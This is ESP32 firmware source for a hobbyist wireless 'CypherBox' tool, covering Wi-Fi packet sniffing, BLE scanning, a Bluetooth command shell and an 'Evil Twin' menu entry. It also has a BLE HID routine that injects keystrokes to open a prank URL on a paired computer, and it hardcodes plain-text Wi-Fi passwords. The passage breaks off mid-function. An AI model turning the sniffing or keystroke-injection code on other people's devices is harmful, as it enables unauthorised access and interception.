#include "freertos/FreeRTOS.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_system.h"
#include "esp_event.h"
#include "esp_event_loop.h"
#include "nvs_flash.h"
#include "driver/gpio.h"
#include "esp_event_loop.h"
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <Adafruit_NeoPixel.h>
#include <U8g2_for_Adafruit_GFX.h>
// BT
#include <BluetoothSerial.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BleKeyboard.h>
#include <BLEServer.h>
// WIFI
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
// Packet Sniffer
#include <stdio.h>
#include <string>
#include <cstddef>
#include <Preferences.h>
#include "FS.h"
#include "SD_MMC.h"
#include "Buffer.h"
// RFID
#include <MFRC522.h>
#include <SPI.h>
// GPS
#include <TinyGPSPlus.h>
#include <HardwareSerial.h>
#include <time.h>
#include <RTClib.h>
#include <SD.h>

// STATE MANAGEMENT
enum AppState {
  STATE_MENU,
  STATE_PACKET_MON,
  STATE_WIFI_SNIFFER,
  STATE_AP_SCAN,
  STATE_AP_JOIN,
  STATE_AP_CREATE,
  STATE_STOP_AP,
  STATE_STOP_SERVER,
  STATE_BT_SCAN,
  STATE_BT_SERIAL,
  STATE_BT_HID,
  STATE_DEVIL_TWIN,
  STATE_RFID,
  STATE_READ_BLOCKS,
  STATE_WARDRIVER,
};
// Global variable to keep track of the current state
AppState currentState = STATE_MENU;

// VARIABLES
enum MenuItem {
  PACKET_MON,
  WIFI_SNIFF,
  AP_SCAN,
  AP_JOIN,
  AP_CREATE,
  STOP_AP,
  STOP_SERVER,
  BT_SCAN,
  BT_CREATE,
  BT_SERIAL_CMD,
  BT_HID,
  // BEACON_SWARM,
  DEVIL_TWIN,
  RFID,
  READ_BLOCKS,
  WARDRIVER,
  // RF_SCAN,
  PARTY_LIGHT,
  LIGHTOFF,
  FILES,
  // DEAUTH,
  SETTINGS,
  HELP,
  NUM_MENU_ITEMS
};

/*
for future nesting of menus to clean it up...
enum WifiItem
{
  AP_SCAN,
  AP_JOIN,
  AP_CREATE,
  STOP_AP,
  STOP_SERVER
};
enum BluetoothItem
{
  BT_SCAN,
  BT_CREATE,
  BT_SERIAL_CMD,
  BT_HID,
};
enum RfidItem
{
  READ,
  WRITE,
  ERASE
};
*/


// volatile bool stopSniffer = false; // Flag to stop the sniffer
volatile bool snifferRunning = true;
const int MAX_VISIBLE_MENU_ITEMS = 3;  // Maximum number of items visible on the screen at a time
MenuItem selectedMenuItem = PACKET_MON;
int firstVisibleMenuItem = 0;

// ***FOR YELLOW/BLUE SSD1306 SCREEN***Adjust the constants and initialization as needed
#define YELLOW_HEIGHT 16
#define BLUE_HEIGHT (SCREEN_HEIGHT - YELLOW_HEIGHT)

// U8g2 for Adafruit GFX
U8G2_FOR_ADAFRUIT_GFX u8g2_for_adafruit_gfx;
// Screen Setup
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
// *** PINS ***
#define NEOPIXEL_PIN 26
Adafruit_NeoPixel strip = Adafruit_NeoPixel(1, NEOPIXEL_PIN, NEO_RGB + NEO_KHZ800);
// LED
#define LED_PIN 19
// Buttons
#define UP_BUTTON_PIN 34
#define DOWN_BUTTON_PIN 35
#define SELECT_BUTTON_PIN 15
#define HOME_BUTTON_PIN 2

// WIFI SETTINGS
String SerialSSID = "";
String SerialPW = "";
int totalNetworks = 0;  // Global variable to store the number of networks found

// PACKET MONITOR SETTINGS
#define MAX_CH 14      // 1 - 14 channels (1-11 for US, 1-13 for EU and 1-14 for Japan)
#define SNAP_LEN 2324  // max len of each recieved packet
#define BUTTON_PIN 15
#define USE_DISPLAY   // comment out if you don't want to use the OLED display
#define FLIP_DISPLAY  // comment out if you don't like to flip it
#define SDA_PIN 21
#define SCL_PIN 22
#define MAX_X 128
#define MAX_Y 51
#if CONFIG_FREERTOS_UNICORE
#define RUNNING_CORE 0
#else
#define RUNNING_CORE 1
#endif
#ifdef USE_DISPLAY
// #include "SH1106.h"
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
// Include the font library if you're using custom fonts
#include <Fonts/FreeMonoBold9pt7b.h>
#endif
Buffer sdBuffer;
using namespace std;
Preferences preferences;
bool useSD = false;
bool buttonPressed = false;
bool buttonEnabled = true;
uint32_t lastDrawTime;
uint32_t lastButtonTime;
uint32_t tmpPacketCounter;
uint32_t pkts[MAX_X];  // here the packets per second will be saved
uint32_t deauths = 0;  // deauth frames per second
unsigned int ch = 1;   // current 802.11 channel
int rssiSum;
// END PACKET MONITOR SETTINGS

// TRIGGERS
bool ap_active = false;


// *** DISPLAY
void initDisplay() {
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {  // Address 0x3C for 128x64
    Serial.println(F("SSD1306 allocation failed"));
    for (;;)
      ;
  }
  display.display();
  delay(2000);
  display.clearDisplay();
}

void drawMenu() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.fillRect(0, 0, SCREEN_WIDTH, YELLOW_HEIGHT, SSD1306_WHITE);  // Fill the top 16px with white (yellow on your screen)
  display.setTextColor(SSD1306_BLACK);                                 // Black text in yellow area
  display.setCursor(5, 4);                                             // Adjust as needed
  display.setTextSize(1);
  display.println("Home");  // Replace with dynamic title if needed
  const char *menuLabels[NUM_MENU_ITEMS] = { "Packet Monitor", "Wifi Sniff", "AP Scan", "AP Join", "AP Create", "Stop AP", "Stop Server", "BT Scan", "BT Create", "BT Ser. CMD", "BT HID", "Devil Twin", "RFID Read", "RFID Read Blocks", "Wardriver",
                                             "Party Light", "Light Off", "Files", "Settings", "Help" };
  // Display the menu items in the blue area
  display.setTextColor(SSD1306_WHITE);  // White text in blue area
  for (int i = 0; i < 2; i++) {         // Only show 2 menu items at a time
    int menuIndex = (firstVisibleMenuItem + i) % NUM_MENU_ITEMS;
    int16_t x = 5;
    int16_t y = YELLOW_HEIGHT + 12 + (i * 20);  // Adjust vertical spacing and offset as needed

    // Highlight the selected item
    if (selectedMenuItem == menuIndex) {
      display.fillRect(0, y - 2, SCREEN_WIDTH, 15, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);  // Black text for highlighted item
    } else {
      display.setTextColor(SSD1306_WHITE);  // White text for other items
    }
    display.setCursor(x, y);
    display.setTextSize(1);
    display.println(menuLabels[menuIndex]);
  }
  display.display();
  updateNeoPixel();
}
void displayInfo(String title, String info1 = "", String info2 = "", String info3 = "") {
  display.clearDisplay();
  drawBorder();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  // Title
  display.setCursor(4, 4);
  display.println(title);
  display.drawLine(0, 14, SCREEN_WIDTH, 14, SSD1306_WHITE);

  // Display info lines with proper spacing and truncation if needed
  int maxTextWidth = 20;  // Approximate character limit per line for 128-pixel width

  // Truncate lines if they exceed the max character count
  if (info1.length() > maxTextWidth) info1 = info1.substring(0, maxTextWidth - 3) + "...";
  if (info2.length() > maxTextWidth) info2 = info2.substring(0, maxTextWidth - 3) + "...";
  if (info3.length() > maxTextWidth) info3 = info3.substring(0, maxTextWidth - 3) + "...";

  // Info lines
  display.setCursor(4, 18);
  display.println(info1);
  display.setCursor(4, 28);
  display.println(info2);
  display.setCursor(4, 38);
  display.println(info3);

  display.display();
}

// *** BLUETOOTH MODULES ***
//  BT SCANNER   //
// Bluetooth Classic settings
BluetoothSerial SerialBT;
// BLE settings
BLEScan *pBLEScan;
int scanTime = 5;  // BLE scan time in seconds
// BLE Advertised Device Callbacks
class MyAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) {
    String deviceInfo = String("BLE Device found: ") + advertisedDevice.toString().c_str();
    Serial.println(deviceInfo);
    display.println(deviceInfo);
    delay(200);
  }
};
void initBTScan() {
  // Initialize BLE
  BLEDevice::init("");
  pBLEScan = BLEDevice::getScan();  // Create new scan
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true);  // Active scan uses more power, but gets results faster
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);  // Less or equal setInterval value
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_adventurer_tr);  // Use a larger font for the title
  u8g2_for_adafruit_gfx.setCursor(20, 40);                 // Centered vertically
  u8g2_for_adafruit_gfx.print("LOADING...");
  display.display();
  delay(2000);
}

// Structure to store minimal device info
struct BTDeviceInfo {
  String address;
  int rssi;
};

BTDeviceInfo deviceList[30];  // Array to store device info
int currentDeviceIndex = 0;   // Index of the currently displayed device
int totalDevices = 0;         // Total number of devices found

void runBTScan() {
  // Start BLE scan and get the device count
  BLEScanResults *foundDevices = pBLEScan->start(scanTime, false);
  int bleDeviceCount = foundDevices->getCount();
  int devicesPerPage = 4;  // Max devices displayed per page
  int currentPage = 0;

  // Store relevant information and free scan results
  totalDevices = min(bleDeviceCount, 30);
  for (int i = 0; i < totalDevices; i++) {
    BLEAdvertisedDevice device = foundDevices->getDevice(i);
    deviceList[i].address = String(device.getAddress().toString().c_str());
    deviceList[i].rssi = device.getRSSI();
  }
  pBLEScan->clearResults();

  // Display loop for pages
  while (true) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.print("Devices found: ");
    display.println(totalDevices);

    // Display devices on the current page
    for (int i = 0; i < devicesPerPage && i + currentPage * devicesPerPage < totalDevices; i++) {
      int index = i + currentPage * devicesPerPage;
      display.setCursor(0, (i + 1) * 10);
      display.print(deviceList[index].address);
      display.print(" RSSI: ");
      display.println(deviceList[index].rssi);
    }
    display.display();

    // Wait for button press to change page
    unsigned long startTime = millis();
    while (millis() - startTime < 10000) {  // 10 seconds to view page
      if (isButtonPressed(SELECT_BUTTON_PIN)) {
        currentPage = (currentPage + 1) % ((totalDevices + devicesPerPage - 1) / devicesPerPage);
        delay(200);  // Simple debounce
        break;
      }
      delay(50);
    }
  }
}

void cleanupBTScan() {
  // Stop BLE scan
  if (pBLEScan) {
    pBLEScan->stop();
    delete pBLEScan;     // Deallocate BLEScan
    pBLEScan = nullptr;  // Avoid dangling pointer
  }
  BLEDevice::deinit();
}
// END BT SCANNER //

// BT SERIAL COMMANDS //
// variables
BleKeyboard bleKeyboard("cypherbox", "cypher", 100);
bool bluetoothActive = true;
String BTssid = "";
String BTpassword = "";
void initBTSerialDisplay() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.begin(display);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_baby_tf);
  const char *commands[] = {
    "BT SERIAL CMDS",
    "Connect Serial Term.",
    "Type HELP",
    "Press Home 2 Exit",
  };
  for (int i = 0; i < 8; i++) {
    u8g2_for_adafruit_gfx.setCursor(0, i * 8);
    u8g2_for_adafruit_gfx.print(commands[i]);
  }
  display.display();
}

void initBTSerial() {
  // Initialize Bluetooth
  if (!SerialBT.begin("cypherboxBT")) {
    Serial.println("An error occurred initializing Bluetooth");
  } else {
    Serial.println("Bluetooth initialized");
  }
}
void runBTSerial() {
  // Check if data is available on Bluetooth
  if (SerialBT.available()) {
    String command = SerialBT.readStringUntil('\n');
    command.trim();  // Remove any leading/trailing whitespace
    handleCommand(command);
  }
}
void handleCommand(String command) {
  Serial.println("Command received: " + command);
  SerialBT.println("Command received: " + command);
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setCursor(0, 0);
  u8g2_for_adafruit_gfx.print("Cmd: " + command);
  display.display();

  if (command.startsWith("WIFI ")) {
    int firstQuote = command.indexOf('"');
    int secondQuote = command.indexOf('"', firstQuote + 1);

    if (firstQuote != -1 && secondQuote != -1) {
      BTssid = command.substring(firstQuote + 1, secondQuote);
      SerialSSID = command.substring(firstQuote + 1, secondQuote);
      SerialBT.println("SSID set to: " + BTssid);
      Serial.println("SSID set to: " + SerialSSID);
      u8g2_for_adafruit_gfx.setCursor(0, 8);
      u8g2_for_adafruit_gfx.print("SSID set: " + BTssid);
      display.display();
    } else {
      SerialBT.println("Invalid WIFI command format. Use: WIFI \"ssid for spaced named\"");
      Serial.println("Invalid WIFI command format. Use: WIFI \"ssid for spaced named\"");
    }
  } else if (command.startsWith("PASS ")) {
    BTpassword = command.substring(5);
    SerialPW = command.substring(5);
    SerialBT.println("Password set to: " + BTpassword);
    Serial.println("Password set to: " + SerialPW);
    u8g2_for_adafruit_gfx.setCursor(0, 8);
    u8g2_for_adafruit_gfx.print("Password set");
    display.display();
  } else if (command == "START_WIFI") {
    startWiFi();
  } else if (command == "STOP_WIFI") {
    stopWiFi();
  } else if (command == "SCAN_WIFI") {
    // scanWiFiNetworks();
  } else if (command == "BT_SCAN") {
    runBTScan();
  } else if (command == "BT_HID") {
    SerialBT.println("BT_HID command selected....");
    Serial.println("BT_HID command selected....");
    u8g2_for_adafruit_gfx.setCursor(0, 8);
    u8g2_for_adafruit_gfx.print("BT HID Selected.");
    // blueHID();
  } else if (command == "STOP_BT") {
    stopBluetooth();
  } else if (command == "CREATE_AP") {
    SerialBT.println("CREATE_AP command received, but not implemented yet.");
  } else if (command == "HELP") {
    SerialBT.println("Available commands:");
    SerialBT.println("1. WIFI \"<SSID>\" - Set the WiFi SSID");
    SerialBT.println("2. PASS <password> - Set the WiFi password");
    SerialBT.println("3. START_WIFI - Start the WiFi connection");
    SerialBT.println("4. STOP_WIFI - Stop the WiFi connection");
    SerialBT.println("5. SCAN_WIFI - Scan for available WiFi networks");
    SerialBT.println("6. BT_SCAN - Scan for Bluetooth devices");
    SerialBT.println("7. BT_HID - Activate Bluetooth HID mode");
    SerialBT.println("8. STOP_BT - Stop Bluetooth connections");
    SerialBT.println("9. CREATE_AP - Create a WiFi access point (not implemented)");
    SerialBT.println("10. HELP - Show this help message");
  } else {
    SerialBT.println("Unknown command: " + command);
    Serial.println("Unknown command: " + command);
  }
}

void startWiFi() {
  if (BTssid == "" || BTpassword == "") {
    SerialBT.println("SSID or Password not set. Use WIFI and PASS commands first.");
    Serial.println("SSID or Password not set. Use WIFI and PASS commands first.");
    u8g2_for_adafruit_gfx.setCursor(0, 16);
    u8g2_for_adafruit_gfx.print("SSID/PASS not set");
    display.display();
    return;
  }

  WiFi.begin(BTssid.c_str(), BTpassword.c_str());
  SerialBT.println("Connecting to WiFi...");
  Serial.println("Connecting to WiFi...");
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setCursor(0, 0);
  u8g2_for_adafruit_gfx.print("Connecting...");
  display.display();

  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) {  // Maximum of 20 attempts
    delay(500);
    SerialBT.print(".");
    Serial.print(".");
    attempts++;
  }

  if (WiFi.status() == WL_CONNECTED) {
    SerialBT.println("\nConnected to WiFi!");
    SerialBT.print("IP Address: ");
    SerialBT.println(WiFi.localIP());
    Serial.println("\nConnected to WiFi!");
    Serial.print("IP Address: ");
    Serial.println(WiFi.localIP());
    display.clearDisplay();
    u8g2_for_adafruit_gfx.setCursor(0, 0);
    u8g2_for_adafruit_gfx.print("Connected: ");
    u8g2_for_adafruit_gfx.print(WiFi.localIP());
    display.display();
  } else {
    SerialBT.println("\nFailed to connect to WiFi");
    Serial.println("\nFailed to connect to WiFi");
    u8g2_for_adafruit_gfx.setCursor(0, 24);
    u8g2_for_adafruit_gfx.print("Failed to connect");
    display.display();
  }
}

// Stop WiFi connection
void stopWiFi() {
  WiFi.disconnect();
  SerialBT.println("WiFi disconnected");
  Serial.println("WiFi disconnected");
  u8g2_for_adafruit_gfx.setCursor(0, 0);
  u8g2_for_adafruit_gfx.print("WiFi disconnected");
  display.display();
}
void stopBluetooth() {
  SerialBT.end();
  SerialBT.println("Bluetooth stopped");
  Serial.println("Bluetooth stopped");
  u8g2_for_adafruit_gfx.setCursor(0, 0);
  u8g2_for_adafruit_gfx.print("BT stopped");
  display.display();
}

// END BT SERIAL COMMANDS //

// BT HID START //

void initBTHid() {
  bleKeyboard.begin();
  Serial.println("Bluetooth HID initialized");
  delay(3000);
}

void runBTHid() {
  if (bleKeyboard.isConnected()) {
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setTextSize(1);
    display.setCursor(0, 0);
    display.println("Starting Rick Roll Hack....!!!");
    Serial.println("Starting Rick Roll Hack....!!!");
    delay(1000);
    display.display();
    // Open browser home page
    bleKeyboard.write(KEY_MEDIA_WWW_HOME);
    delay(6000);
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("Opening Rick Roll Hack....");
    Serial.println("Opening Rick Roll Hack....");
    display.display();
    // URL to open
    const char *url = "https://youtu.be/oHg5SJYRHA0?si=bfXXjVeR5UyKoh4n";

    // Type the URL with a small delay between each character
    for (size_t i = 0; i < strlen(url); i++) {
      bleKeyboard.write(url[i]);
      delay(50);  // Adjust this delay if needed
    }
    delay(500);  // Small delay before pressing enter
    bleKeyboard.press(KEY_RETURN);
    bleKeyboard.releaseAll();
    delay(10000);  // Adjust this delay according to Chrome's load time
    display.setCursor(0, 12);
    display.println("Hack complete....!");
    Serial.println("Hack complete....!");
    display.display();
    delay(1000);
    display.setCursor(0, 24);
    display.println("BT HID Complete....");
    Serial.println("BT HID Complete....");
    delay(2000);
    display.display();

    delay(1000);
  }

  Serial.println("Waiting 5 seconds to connect...");
  display.clearDisplay();
  display.setCursor(0, 0);
  display.println("Waiting 5 seconds to connect...");
  display.display();
  delay(5000);
}
// END BT HID //

// *** WIFI MODULES ***

// Network data structure
struct _Network {
  String ssid;
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t encryptionType;
  uint8_t ch;
};

_Network _networks[16];  // Adjust size as needed
void clearArray() {
  for (int i = 0; i < 16; ++i) {
    _networks[i].ssid = "";
    memset(_networks[i].bssid, 0, sizeof(_networks[i].bssid));
    _networks[i].rssi = 0;
    _networks[i].encryptionType = 0;
    _networks[i].ch = 0;
  }
}


void performScan() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_adventurer_tr);  // Use a larger font for the title
  u8g2_for_adafruit_gfx.setCursor(20, 40);                 // Centered vertically
  u8g2_for_adafruit_gfx.print("LOADING...");
  display.display();
  int n = WiFi.scanNetworks();
  totalNetworks = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    Serial.println("Scanned Networks:");
    for (int i = 0; i < n && i < 30; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      Serial.print("SSID: ");
      Serial.println(network.ssid);

      Serial.print("BSSID: ");
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
        Serial.print(network.bssid[j], HEX);
        if (j < 5) {
          Serial.print(":");
        }
      }
      Serial.println();
      network.rssi = WiFi.RSSI(i);
      Serial.print("RSSI: ");
      Serial.println(network.rssi);

      network.ch = WiFi.channel(i);
      Serial.print("Channel: ");
      Serial.println(network.ch);

      _networks[i] = network;
    }
  }
}
int currentIndex = 0;  // Keep track of the current starting index for the display
const int networksPerPage = 5;

void displayNetworkScan() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_baby_tf);  // Set to a small font

  // Display the title
  u8g2_for_adafruit_gfx.setCursor(0, 10);
  u8g2_for_adafruit_gfx.print("Networks Found: " + totalNetworks);

  // Iterate through the _networks array and display each SSID
  for (int i = 0; i < networksPerPage; ++i) {
    int index = currentIndex + i;
    if (_networks[index].ssid == "") {
      break;  // Stop if there are no more networks
    }

    // Truncate the SSID if it's too long
    String ssid = _networks[index].ssid;
    if (ssid.length() > 10) {
      ssid = ssid.substring(0, 10) + "...";
    }

    // Set cursor position for each network (10 pixels per line)
    int y = 22 + (i * 10);
    u8g2_for_adafruit_gfx.setCursor(0, y);
    u8g2_for_adafruit_gfx.print(ssid);

    // Display RSSI
    u8g2_for_adafruit_gfx.setCursor(60, y);
    u8g2_for_adafruit_gfx.print(_networks[index].rssi);
    u8g2_for_adafruit_gfx.print(" dBm");

    // Display channel
    u8g2_for_adafruit_gfx.setCursor(95, y);
    u8g2_for_adafruit_gfx.print("CH:");
    u8g2_for_adafruit_gfx.print(_networks[index].ch);

    // If the display area is exceeded, stop displaying
    if (y > 63) {
      break;
    }
  }

  display.display();

  // Check if the button is pressed to iterate through networks
  if (isButtonPressed(SELECT_BUTTON_PIN)) {
    currentIndex += networksPerPage;  // Move to the next set of networks
    if (currentIndex >= 16) {         // If we've reached the end, loop back
      currentIndex = 0;
    }
  }
}

// Wifi Connect Credentials
const char *ssid = "thanos lives forever";
const char *password = "ntwatwa1990";
// Create a web server object
WebServer server(80);
bool serverRunning = false;
// Function to handle the root path (/)

void startServer() {
  // Connect to WiFi
  Serial.print("Connecting to ");
  Serial.println(ssid);
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_baby_tf);  // Set to a small font
  u8g2_for_adafruit_gfx.setCursor(0, 10);
  u8g2_for_adafruit_gfx.print(ssid);
  WiFi.begin(ssid, password);
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
    u8g2_for_adafruit_gfx.setCursor(0, 20);
    u8g2_for_adafruit_gfx.print(ssid);
  }
  Serial.println("");
  Serial.println("WiFi: ");
  Serial.println(ssid);
  Serial.print("IP address: ");
  Serial.println(WiFi.localIP());
  // Clear the display (assuming 'display' is a valid object)
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setCursor(0, 10);
  u8g2_for_adafruit_gfx.print("WiFi: ");
  u8g2_for_adafruit_gfx.print(ssid);
  u8g2_for_adafruit_gfx.setCursor(0, 30);
  u8g2_for_adafruit_gfx.print("Web Serv: ");
  u8g2_for_adafruit_gfx.print(WiFi.localIP());

  // Start the web server
  server.on("/", handleRoot);
  server.begin();
  serverRunning = true;
  Serial.println("Server started");
  u8g2_for_adafruit_gfx.setCursor(0, 40);
  u8g2_for_adafruit_gfx.print("Connect to Web UI");
  u8g2_for_adafruit_gfx.setCursor(0, 50);
  u8g2_for_adafruit_gfx.print("Press Home to Exit.");
  display.display();
  // server.handleClient();
}

// SOFT AP credentials to create wifi network
const char *softAP = "cypherbox";
const char *softPass = "cypher12345!";
void startSoftAP() {
  // Connect to WiFi
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_baby_tf);  // Set to a small font
  Serial.print("Creating Soft AP:");
  Serial.println(softAP);
  Serial.println(softPass);
  u8g2_for_adafruit_gfx.setCursor(0, 10);
  u8g2_for_adafruit_gfx.print("Creating Soft Ap...");
  u8g2_for_adafruit_gfx.setCursor(0, 20);
  u8g2_for_adafruit_gfx.print(ssid);
  WiFi.softAP(softAP, softPass);
  IPAddress IP = WiFi.softAPIP();
  delay(2000);
  Serial.print("SOFT AP IP address: ");
  Serial.println(IP);

  Serial.println("");
  Serial.println("WEB UI STARTED");
  Serial.print("IP address: ");
  Serial.println(WiFi.localIP());
  // Clear the display (assuming 'display' is a valid object)
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setCursor(0, 10);
  u8g2_for_adafruit_gfx.print("WEB AP STARTED");
  u8g2_for_adafruit_gfx.setCursor(0, 30);
  u8g2_for_adafruit_gfx.print("Connect to UI :");
  u8g2_for_adafruit_gfx.setCursor(0, 40);
  u8g2_for_adafruit_gfx.print("IP: ");
  u8g2_for_adafruit_gfx.print(WiFi.localIP());

  // Start the web server
  server.on("/", handleRoot);
  server.begin();
  serverRunning = true;
  Serial.println("Server started");
  u8g2_for_adafruit_gfx.setCursor(0, 50);
  u8g2_for_adafruit_gfx.print("Wifi:");
  u8g2_for_adafruit_gfx.setCursor(0, 60);
  u8g2_for_adafruit_gfx.print(ssid);
  // server.handleClient();
  display.display();
}

// This is the WEB UI for CypherBox
void handleRoot() {
  server.send(200, "text/html", "<h1>Welcome to Cypher Box!</h1><br><h3>This is a simple web portal where you can acess your Cypher ^_^</h3>");
}
void handleStopServer() {
  serverRunning = false;
  server.send(200, "text/html", "<h1>Server stopped.</h1>");
  server.stop();
  Serial.println("Server stopped");
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setCursor(0, 10);
  u8g2_for_adafruit_gfx.print("WEB SERVER STOPPED!");
  u8g2_for_adafruit_gfx.setCursor(0, 30);
  u8g2_for_adafruit_gfx.print("Press home key to go back.");
  display.display();
}
void handleStopAP() {
  serverRunning = false;
  server.stop();
  WiFi.softAPdisconnect(true);
  Serial.println("Server stopped & soft AP turned off");
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setCursor(0, 10);
  u8g2_for_adafruit_gfx.print("SOFT AP STOPPED!");
  u8g2_for_adafruit_gfx.setCursor(0, 20);
  u8g2_for_adafruit_gfx.print("Press home key to go back.");
  display.display();
}
void printOnDisplay(String message) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);

  // Set the box coordinates and size
  /*int16_t x1, y1;
      uint16_t w, h;
      display.getTextBounds(message, 0, 0, &x1, &y1, &w, &h);
      display.drawRect(x1 - 2, y1 - 2, w + 4, h + 4, SSD1306_WHITE);
      */
  display.println(message);
  display.display();
  // u8g2 addition
  /*
      display.clearDisplay()'
      u8g2_for_adafruit_gfx.setFont(u8g2_font_tom_thumb_4x6_mr); // Set back to small font
      u8g2_for_adafruit_gfx.setCursor(0, 0);
      u8g2_for_adafruit_gfx.print(message);
      display.display();
      */
}
// ***PACKET MONITOR START*** //

/* ===== functions ===== */
double getMultiplicator() {
  uint32_t maxVal = 1;
  for (int i = 0; i < MAX_X; i++) {
    if (pkts[i] > maxVal)
      maxVal = pkts[i];
  }
  if (maxVal > MAX_Y)
    return (double)MAX_Y / (double)maxVal;
  else
    return 1;
}

void setChannel(int newChannel) {
  ch = newChannel;
  if (ch > MAX_CH || ch < 1)
    ch = 1;

  preferences.begin("packetmonitor32", false);
  preferences.putUInt("channel", ch);
  preferences.end();

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous);
  esp_wifi_set_promiscuous(true);
}

bool setupSD() {
  if (!SD_MMC.begin()) {
    Serial.println("Card Mount Failed");
    return false;
  }

  uint8_t cardType = SD_MMC.cardType();

  if (cardType == CARD_NONE) {
    Serial.println("No SD_MMC card attached");
    return false;
  }

  Serial.print("SD_MMC Card Type: ");
  if (cardType == CARD_MMC) {
    Serial.println("MMC");
  } else if (cardType == CARD_SD) {
    Serial.println("SDSC");
  } else if (cardType == CARD_SDHC) {
    Serial.println("SDHC");
  } else {
    Serial.println("UNKNOWN");
  }

  uint64_t cardSize = SD_MMC.cardSize() / (1024 * 1024);
  Serial.printf("SD_MMC Card Size: %lluMB\n", cardSize);

  return true;
}

void wifi_promiscuous(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;

  if (type == WIFI_PKT_MGMT && (pkt->payload[0] == 0xA0 || pkt->payload[0] == 0xC0))
    deauths++;

  if (type == WIFI_PKT_MISC)
    return;  // wrong packet type
  if (ctrl.sig_len > SNAP_LEN)
    return;  // packet too long

  uint32_t packetLength = ctrl.sig_len;
  if (type == WIFI_PKT_MGMT)
    packetLength -= 4;  // fix for known bug in the IDF https://github.com/espressif/esp-idf/issues/886

  // Serial.print(".");
  tmpPacketCounter++;
  rssiSum += ctrl.rssi;

  if (useSD)
    sdBuffer.addPacket(pkt->payload, packetLength);
}

void draw() {
#ifdef USE_DISPLAY
  double multiplicator = getMultiplicator();
  int len;
  int rssi;

  if (pkts[MAX_X - 1] > 0)
    rssi = rssiSum / (int)pkts[MAX_X - 1];
  else
    rssi = rssiSum;

  display.fillScreen(SSD1306_BLACK);    // Clear the screen
  display.setTextColor(SSD1306_WHITE);  // Set text color to white

  display.setCursor(0, 0);  // Set cursor position for left-aligned text
  display.print("CH:" + String(ch) + " ");
  display.setCursor(30, 0);  // Set cursor position for right-aligned text
  display.print("R:" + String(rssi));
  display.setCursor(65, 0);  // Set cursor position for right-aligned text
  display.print("P:[" + String(tmpPacketCounter) + "] " + "D:" + String(deauths));
  display.print(useSD ? "SD" : "");

  display.setCursor(95, 0);  // Set cursor position for left-aligned text
  // display.print("Pkts:");

  display.drawLine(0, 63 - MAX_Y, MAX_X, 63 - MAX_Y, SSD1306_WHITE);  // Add color to drawLine
  for (int i = 0; i < MAX_X; i++) {
    len = pkts[i] * multiplicator;
    display.drawLine(i, 63, i, 63 - (len > MAX_Y ? MAX_Y : len), SSD1306_WHITE);
    if (i < MAX_X - 1)
      pkts[i] = pkts[i + 1];
  }
  display.display();
#endif
}
void coreTask(void *p) {

  uint32_t currentTime;

  while (true) {

    currentTime = millis();

    /* bit of spaghetti code, have to clean this up later :D */

    // check button
    if (digitalRead(BUTTON_PIN) == LOW) {
      if (buttonEnabled) {
        if (!buttonPressed) {
          buttonPressed = true;
          lastButtonTime = currentTime;
        } else if (currentTime - lastButtonTime >= 2000) {
          if (useSD) {
            useSD = false;
            sdBuffer.close(&SD_MMC);
            draw();
          } else {
            if (setupSD())
              sdBuffer.open(&SD_MMC);
            draw();
          }
          buttonPressed = false;
          buttonEnabled = false;
        }
      }
    } else {
      if (buttonPressed) {
        setChannel(ch + 1);
        draw();
      }
      buttonPressed = false;
      buttonEnabled = true;
    }

    // save buffer to SD
    if (useSD)
      sdBuffer.save(&SD_MMC);

    // draw Display
    if (currentTime - lastDrawTime > 1000) {
      lastDrawTime = currentTime;
